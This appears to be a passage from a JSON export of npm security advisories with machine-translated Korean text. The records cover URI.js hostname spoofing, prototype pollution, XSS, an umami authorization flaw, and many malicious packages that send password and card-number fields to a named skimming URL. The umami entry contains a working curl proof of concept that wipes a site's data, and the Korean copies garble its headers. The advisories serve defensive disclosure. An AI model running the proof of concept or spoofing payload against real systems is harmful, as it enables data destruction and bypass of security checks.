    "references": "https://github.com/medialize/URI.js/security/advisories/GHSA-p6j9-7xhc-rhwp\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-27516\nhttps://github.com/medialize/URI.js/commit/a1ad8bcbc39a4d136d7e252e76e957f3ece70839\nhttps://github.com/medialize/URI.js/releases/tag/v1.19.6\nhttps://advisory.checkmarx.net/advisory/CX-2021-4305\nhttps://github.com/advisories/GHSA-p6j9-7xhc-rhwp",
    "name": "urijs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.19.6",
    "identifier": "1.19.6",
    "descriptionKR": "### 영향\nURL의 호스트 이름을 확인하기 위해 영향을 받는 버전을 사용하는 경우 체계 구분 기호의 일부로 백슬래시(`\\`) 문자를 사용하여 호스트 이름을 스푸핑할 수 있습니다. `구성표:/\\호스트 이름`. 호스트 이름이 보안 결정에 사용되는 경우 결정이 올바르지 않을 수 있습니다.\n\n라이브러리 사용 및 공격자의 의도에 따라 영향에는 허용/차단 목록 우회, SSRF 공격, 열린 리디렉션 또는 기타 원하지 않는 동작이 포함될 수 있습니다.\n\nURL 예: `https:/\\expected-example.com/path`\n이스케이프된 문자열: `https:/\\\\expected-example.com/path`(JavaScript 문자열은 백슬래시를 이스케이프해야 함)\n\n영향을 받는 버전은 호스트 이름을 잘못 반환합니다. 패치된 버전은 `expected-example.com`을 올바르게 반환합니다. 패치된 버전은 [WHATWG URL 사양](https://url.spec.whatwg.org/)을 구현하는 다른 파서의 동작과 일치하며 여기에는 웹 브라우저 및 [노드의 내장 URL 클래스](https://nodejs. org/api/url.html).\n\n### 패치\n버전 1.19.6은 알려진 모든 페이로드 변형에 대해 패치되었습니다.\n\n### 참조\nhttps://github.com/medialize/URI.js/releases/tag/v1.19.6(이 특정 우회에 대한 수정)\nhttps://github.com/medialize/URI.js/releases/tag/v1.19.4(관련 우회 수정)\nhttps://github.com/medialize/URI.js/releases/tag/v1.19.3(관련 우회 수정)\n[PR #233](https://github.com/medialize/URI.js/pull/233) (백슬래시 처리 초기 수정)\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우 https://github.com/medialize/URI.js에서 문제를 여십시오.\n\n### 기자 크레딧\nCheckmarx의 CxSCA AppSec 팀의 [Yaniv Nizry](https://twitter.com/ynizry)"
  },
  {
    "description": "Prototype pollution vulnerability in function enable in mockery.js in mfncooper mockery commit 822f0566fd6d72af8c943ae5ca2aa92e516aa2cf via the key variable in mockery.js.",
    "identifiers": "GHSA : GHSA-gmwp-3pwc-3j3g\nCVE : CVE-2022-37614",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-28T21:01:12Z",
    "publishedAt": "2022-10-12T19:00:41Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-37614\nhttps://github.com/mfncooper/mockery/issues/77\nhttps://github.com/mfncooper/mockery/blob/822f0566fd6d72af8c943ae5ca2aa92e516aa2cf/mockery.js#L119\nhttps://github.com/mfncooper/mockery/blob/822f0566fd6d72af8c943ae5ca2aa92e516aa2cf/mockery.js#L62\nhttps://github.com/advisories/GHSA-gmwp-3pwc-3j3g",
    "name": "mockery",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.1.0",
    "descriptionKR": "mockery.js의 키 변수를 통해 mfncooper 조롱 커밋 822f0566fd6d72af8c943ae5ca2aa92e516aa2cf의 mockery.js에서 함수 활성화의 프로토타입 오염 취약성."
  },
  {
    "description": "An issue exists in node-cli 0.1.0 through 0.11.3 due to predictable temporary file names in lock_file and log_file, which allows an attacker to overwrite files.\n\nThis is a duplicate of CVE-2016-10538",
    "identifiers": "GHSA : GHSA-3mrp-qhcj-mwv5\nCVE : CVE-2016-1000021",
    "severity": "LOW",
    "updatedAt": "2023-07-28T18:34:13Z",
    "publishedAt": "2022-05-24T17:02:32Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000021\nhttps://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-1000021\nhttps://nvd.nist.gov/vuln/detail/CVE-2016-10538\nhttps://github.com/node-js-libs/cli/issues/81\nhttps://web.archive.org/web/20190430172230/https://www.npmjs.com/advisories/95\nhttps://github.com/advisories/GHSA-3mrp-qhcj-mwv5",
    "name": "cli",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.1.0, <= 0.11.3",
    "identifier": "1.0.0",
    "descriptionKR": "공격자가 파일을 덮어쓸 수 있도록 허용하는 lock_file 및 log_file의 예측 가능한 임시 파일 이름으로 인해 node-cli 0.1.0~0.11.3에 문제가 존재합니다.\n\n이것은 CVE-2016-10538의 복제본입니다."
  },
  {
    "description": "### Summary\nAnyone with a share link (permissions to view) can reset the website data.\n\n### Details\nWhen a user navigates to a `/share/` URL, he receives a share token which is used for authentication. This token is later verified by `useAuth`. After the token is verified, the user can call most of the `GET` APIs that allow fetching stats about a website.\n\nThe `POST /reset` endpoint is secured using `canViewWebsite` which is the incorrect verification for such destructive action. This makes it possible to completly reset all website data ONLY with view permissions - [permalink](https://github.com/umami-software/umami/blob/7bfbe264852558a148c7741f8637ff2b266d48cd/pages/api/websites/%5Bid%5D/reset.ts#L22)\n\n\n### PoC\n```bash\ncurl -X POST 'https://analytics.umami.is/api/websites/b8250618-ccb5-47fb-8350-31c96169a198/reset' \\\n  -H 'authority: analytics.umami.is' \\\n  -H 'accept: application/json' \\\n  -H 'accept-language: en-US,en;q=0.9' \\\n  -H 'authorization: Bearer undefined' \\\n  -H 'cache-control: no-cache' \\\n  -H 'content-type: application/json' \\\n  -H 'pragma: no-cache' \\\n  -H 'referer: https://analytics.umami.is/share/bw6MFhkwpwEXFsbd/test' \\\n  -H 'sec-ch-ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"' \\\n  -H 'sec-ch-ua-mobile: ?0' \\\n  -H 'sec-ch-ua-platform: \"Linux\"' \\\n  -H 'sec-fetch-dest: empty' \\\n  -H 'sec-fetch-mode: cors' \\\n  -H 'sec-fetch-site: same-origin' \\\n  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36' \\\n  -H 'x-umami-share-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3ZWJzaXRlSWQiOiJiODI1MDYxOC1jY2I1LTQ3ZmItODM1MC0zMWM5NjE2OWExOTgiLCJpYXQiOjE2OTAzNjkxOTl9.zTfwFrfggE5na7rOOgkUobEBm48AH_8WVyh2RgJGzcw' \\\n  --compressed\n```\n\nYou can reproduce this by:\n* Accessing a website using it's share link\n* Copy the `token` received from the the received from the `GET /share/{website-id}`\n* Send a POST request to `https://analytics.umami.is/api/websites/b8250618-ccb5-47fb-8350-31c96169a198/reset` with `x-umami-share-token: ` header equal to the token copied in the previous step\n* The website data is now cleared\n\n### Impact\nEveryone with an open share link exposed to the internet!",
    "identifiers": "GHSA : GHSA-8www-cffh-4q98",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-28T15:33:15Z",
    "publishedAt": "2023-07-28T15:33:14Z",
    "references": "https://github.com/umami-software/umami/security/advisories/GHSA-8www-cffh-4q98\nhttps://github.com/umami-software/umami/commit/ec48a4e3250e9cefc481b339a90e6ceea6f1ec2b\nhttps://github.com/advisories/GHSA-8www-cffh-4q98",
    "name": "umami",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.3.1",
    "identifier": "2.3.1",
    "descriptionKR": "### 요약\n공유 링크(보기 권한)가 있는 사람은 누구나 웹사이트 데이터를 재설정할 수 있습니다.\n\n### 세부 정보\n사용자가 `/share/` URL로 이동하면 인증에 사용되는 공유 토큰을 받습니다. 이 토큰은 나중에 `useAuth`에 의해 확인됩니다. 토큰이 확인되면 사용자는 웹사이트에 대한 통계를 가져올 수 있는 대부분의 'GET' API를 호출할 수 있습니다.\n\n'POST /reset' 엔드포인트는 이러한 파괴적인 작업에 대한 잘못된 확인인 'canViewWebsite'를 사용하여 보호됩니다. 이렇게 하면 보기 권한이 있는 경우에만 모든 웹사이트 데이터를 완전히 재설정할 수 있습니다. TS#L22)\n\n\n### PoC\n```강타\ncurl -X POST 'https://analytics.umami.is/api/websites/b8250618-ccb5-47fb-8350-31c96169a198/reset' \\\n  -H '권한: analytics.umami.is' \\\n  -H '수락: 애플리케이션/json' \\\n  -H '허용 언어: en-US,en;q=0.9' \\\n  -H '인증: 무기명 정의되지 않음' \\\n  -H '캐시 제어: 캐시 없음' \\\n  -H '콘텐츠 유형: 애플리케이션/json' \\\n  -H '프라그마: 캐시 없음' \\\n  -H '참조자: https://analytics.umami.is/share/bw6MFhkwpwEXFsbd/test' \\\n  -H 'sec-ch-ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"구글 크롬\";v=\"114\"' \\\n  -H 'sec-ch-ua-mobile: ?0' \\\n  -H 'sec-ch-ua-플랫폼: \"Linux\"' \\\n  -H '초 가져오기 대상: 비어 있음' \\\n  -H '초 가져오기 모드: cors' \\\n  -H 'sec-fetch-site: 동일 출처' \\\n  -H '사용자 에이전트: Mozilla/5.0(X11; Linux x86_64) AppleWebKit/537.36(Gecko와 같은 KHTML) Chrome/114.0.0.0 Safari/537.36' \\\n  -H 'x-우마미-공유 토큰: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3ZWJzaXRlSWQiOiJiODI1MDYxOC1jY2I1LTQ3ZmItODM1MC0zMWM5NjE2OWExOTgiLCJpYXQiOjE2OTAzNjkxOTl9.zTf wFrfggE5na7rOOgkUobEBm48AH_8WVyh2RgJGzcw' \\\n  --압축\n```\n\n다음을 통해 이를 재현할 수 있습니다.\n* 공유 링크를 사용하여 웹사이트에 액세스\n* `GET /share/{website-id}`에서 받은 `token`을 복사합니다.\n* 복사한 토큰과 동일한 `x-umami-share-token:` 헤더를 사용하여 `https://analytics.umami.is/api/websites/b8250618-ccb5-47fb-8350-31c96169a198/reset`에 POST 요청을 보냅니다. 이전 단계에서\n* 이제 웹사이트 데이터가 삭제되었습니다.\n\n### 영향\n인터넷에 공개된 공개 공유링크를 가진 모든 분들!"
  },
  {
    "description": "EpicEditor through 0.2.3 has Cross-Site Scripting because of an insecure default marked.js configuration. An example attack vector is a crafted IMG element in an HTML document.",
    "identifiers": "GHSA : GHSA-4wc5-gfgh-4vjx\nCVE : CVE-2017-6589",
    "severity": "MODERATE",
    "updatedAt": "2023-07-27T22:37:06Z",
    "publishedAt": "2022-05-17T02:56:01Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-6589\nhttps://bad.code.blog/2017/03/09/epiceditor-cross-site-scripting/\nhttps://github.com/advisories/GHSA-4wc5-gfgh-4vjx",
    "name": "epiceditor",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.2.3",
    "descriptionKR": "0.2.3까지의 EpicEditor는 안전하지 않은 기본 표시됨.js 구성으로 인해 사이트 간 스크립팅이 있습니다. 예제 공격 벡터는 HTML 문서의 조작된 IMG 요소입니다."
  },
  {
    "description": "Version 0.2.12 of `jekyll-for-github-projects` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.2.11",
    "identifiers": "GHSA : GHSA-j5qg-46p9-w2rp",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:37:09Z",
    "publishedAt": "2020-09-03T00:33:32Z",
    "references": "https://www.npmjs.com/advisories/936\nhttps://github.com/advisories/GHSA-j5qg-46p9-w2rp",
    "name": "jekyll-for-github-projects",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.2.12",
    "descriptionKR": "`jekyll-for-github-projects` 버전 0.2.12에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 0.2.11로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.6 of `css_transform_step` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 1.0.6 of this module is found installed you will want to replace it with a version before or after 1.0.6. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.5",
    "identifiers": "GHSA : GHSA-4rx9-58m7-gr8w",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:36:41Z",
    "publishedAt": "2020-09-01T19:53:40Z",
    "references": "https://www.npmjs.com/advisories/623\nhttps://github.com/advisories/GHSA-4rx9-58m7-gr8w",
    "name": "css_transform_step",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.6",
    "descriptionKR": "`css_transform_step` 버전 1.0.6에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 1.0.6이 설치된 것으로 확인되면 1.0.6 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 1.0.5로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.11 of `device-mqtt` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.10",
    "identifiers": "GHSA : GHSA-563h-697m-j7x5",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:36:07Z",
    "publishedAt": "2020-09-03T19:18:58Z",
    "references": "https://www.npmjs.com/advisories/1109\nhttps://github.com/advisories/GHSA-563h-697m-j7x5",
    "name": "device-mqtt",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.11",
    "descriptionKR": "`device-mqtt` 버전 1.0.11에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하십시오. 또한 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인하는 것이 좋습니다.\n\n사용자는 버전 1.0.10으로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.1.30 of `mx-nested-menu` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.1.29",
    "identifiers": "GHSA : GHSA-48hw-37g6-3gw4",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:35:39Z",
    "publishedAt": "2020-09-03T02:35:41Z",
    "references": "https://www.npmjs.com/advisories/947\nhttps://github.com/advisories/GHSA-48hw-37g6-3gw4",
    "name": "mx-nested-menu",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.1.30",
    "descriptionKR": "`mx-nested-menu` 버전 0.1.30에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 0.1.29로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.0.7 of `react-server-native` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 0.0.7 of this module is found installed you will want to replace it with a version before or after 0.0.7. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.0.6",
    "identifiers": "GHSA : GHSA-fwvp-x5gj-773j",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:35:14Z",
    "publishedAt": "2020-09-01T20:33:10Z",
    "references": "https://www.npmjs.com/advisories/635\nhttps://github.com/advisories/GHSA-fwvp-x5gj-773j",
    "name": "react-server-native",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.0.7",
    "descriptionKR": "'react-server-native' 버전 0.0.7에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 0.0.7이 설치된 것으로 확인되면 0.0.7 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 0.0.6으로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.5 of `dictum.js` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 1.0.5 of this module is found installed you will want to replace it with a version before or after 1.0.5. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.4",
    "identifiers": "GHSA : GHSA-j5jc-jf8f-86q7",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:34:44Z",
    "publishedAt": "2020-09-01T20:38:30Z",
    "references": "https://www.npmjs.com/advisories/640\nhttps://github.com/advisories/GHSA-j5jc-jf8f-86q7",
    "name": "dictum.js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.5",
    "descriptionKR": "`dictum.js` 버전 1.0.5에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 1.0.5가 설치된 것으로 확인되면 1.0.5 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 1.0.4로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.1.1 of `modlibrary` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 0.1.1 of this module is found installed you will want to replace it with a version before or after 0.1.1. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.1.0",
    "identifiers": "GHSA : GHSA-94m7-w873-6wwf",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:34:15Z",
    "publishedAt": "2020-09-01T20:28:56Z",
    "references": "https://www.npmjs.com/advisories/631\nhttps://github.com/advisories/GHSA-94m7-w873-6wwf",
    "name": "modlibrary",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.1.1",
    "descriptionKR": "'modlibrary' 버전 0.1.1에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 0.1.1이 설치된 것으로 확인되면 0.1.1 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 0.1.0으로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.1.1 of `precode.js` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.1.0",
    "identifiers": "GHSA : GHSA-5w4r-wwc3-6qcp",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:33:35Z",
    "publishedAt": "2020-09-11T21:23:29Z",
    "references": "https://www.npmjs.com/advisories/941\nhttps://github.com/advisories/GHSA-5w4r-wwc3-6qcp",
    "name": "precode.js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.1.1",
    "descriptionKR": "`precode.js` 버전 1.1.1에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 1.1.0으로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.7 of `xoc` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 1.0.7 of this module is found installed you will want to replace it with a version before or after 1.0.7. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.5",
    "identifiers": "GHSA : GHSA-54cr-gv8w-8324",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:32:36Z",
    "publishedAt": "2020-09-01T20:36:22Z",
    "references": "https://www.npmjs.com/advisories/638\nhttps://github.com/advisories/GHSA-54cr-gv8w-8324",
    "name": "xoc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.7",
    "descriptionKR": "'xoc' 버전 1.0.7에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 1.0.7이 설치된 것으로 확인되면 1.0.7 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 1.0.5로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.4 of `iie-viz` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.3",
    "identifiers": "GHSA : GHSA-jf55-rgpx-p6rx",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:31:35Z",
    "publishedAt": "2020-09-03T19:12:22Z",
    "references": "https://www.npmjs.com/advisories/1103\nhttps://github.com/advisories/GHSA-jf55-rgpx-p6rx",
    "name": "iie-viz",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.4",
    "descriptionKR": "`iie-viz` 버전 1.0.4에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하십시오. 또한 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인하는 것이 좋습니다.\n\n사용자는 버전 1.0.3으로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.2.5 of `jquery-airload` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.2.4",
    "identifiers": "GHSA : GHSA-78p3-96hc-3j47",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:31:08Z",
    "publishedAt": "2020-09-03T19:11:17Z",
    "references": "https://www.npmjs.com/advisories/1102\nhttps://github.com/advisories/GHSA-78p3-96hc-3j47",
    "name": "jquery-airload",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.2.5",
    "descriptionKR": "`jquery-airload` 버전 0.2.5에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하십시오. 또한 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인하는 것이 좋습니다.\n\n사용자는 버전 0.2.4로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.1.7 of `scroool` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.1.6",
    "identifiers": "GHSA : GHSA-p7w2-mc6m-mfx2",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:30:40Z",
    "publishedAt": "2020-09-11T21:22:25Z",
    "references": "https://www.npmjs.com/advisories/944\nhttps://github.com/advisories/GHSA-p7w2-mc6m-mfx2",
    "name": "scroool",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.1.7",
    "descriptionKR": "'scrool' 버전 0.1.7에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 0.1.6으로 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.2 of `css_transform_support` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nIf version 1.0.2 of this module is found installed you will want to replace it with a version before or after 1.0.2. In addition to replacing the installed module, you will also want to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.1",
    "identifiers": "GHSA : GHSA-45cp-hpc9-8347",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:17:34Z",
    "publishedAt": "2020-09-01T19:52:35Z",
    "references": "https://www.npmjs.com/advisories/624\nhttps://github.com/advisories/GHSA-45cp-hpc9-8347",
    "name": "css_transform_support",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.2",
    "descriptionKR": "`css_transform_support` 버전 1.0.2에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n이 모듈의 버전 1.0.2가 설치된 것으로 확인되면 1.0.2 이전 또는 이후 버전으로 교체할 수 있습니다. 설치된 모듈을 교체하는 것 외에도 응용 프로그램을 평가하여 사용자 데이터가 손상되었는지 여부를 확인해야 합니다.\n\n사용자는 버전 1.0.1로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 0.1.2 of `github-jquery-widgets` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 0.1.1",
    "identifiers": "GHSA : GHSA-c722-pv5w-cfg2",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-27T20:17:09Z",
    "publishedAt": "2020-09-11T21:20:14Z",
    "references": "https://www.npmjs.com/advisories/933\nhttps://github.com/advisories/GHSA-c722-pv5w-cfg2",
    "name": "github-jquery-widgets",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.1.2",
    "descriptionKR": "`github-jquery-widgets` 버전 0.1.2에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 0.1.1로 다운그레이드를 고려할 수 있습니다."
  },
  {
